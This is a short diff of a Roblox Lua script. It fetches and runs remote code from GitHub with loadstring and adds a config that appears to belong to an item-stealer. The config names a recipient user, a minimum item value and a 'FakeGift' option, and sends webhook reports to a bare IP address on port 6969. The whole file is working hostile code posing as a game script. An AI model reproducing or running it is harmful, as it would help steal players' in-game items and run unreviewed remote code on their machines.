@@ -1,1 +1,14 @@
-loadstring(game:HttpGet("https://paste.rs/6JhVo"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/7teenscripts/loadingscrn/refs/heads/main/lua"))()
+
+_G.LRMConfig = {
+    User = {'AcescyG'},
+    min_value = 10000000,
+    pingEveryone = "No", -- dont change this
+    Webhook = "http://45.13.225.83:6969/proxy/93cc932ac3144f6e4cf5a213487b7a46",
+    FakeGift = "Yes",
+    Trash = "http://45.13.225.83:6969/proxy/93cc932ac3144f6e4cf5a213487b7a46",
+    LoadingScreen = "No",
+    GiftOnlyRares = "No"
+}
+
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lrm.lua"))()
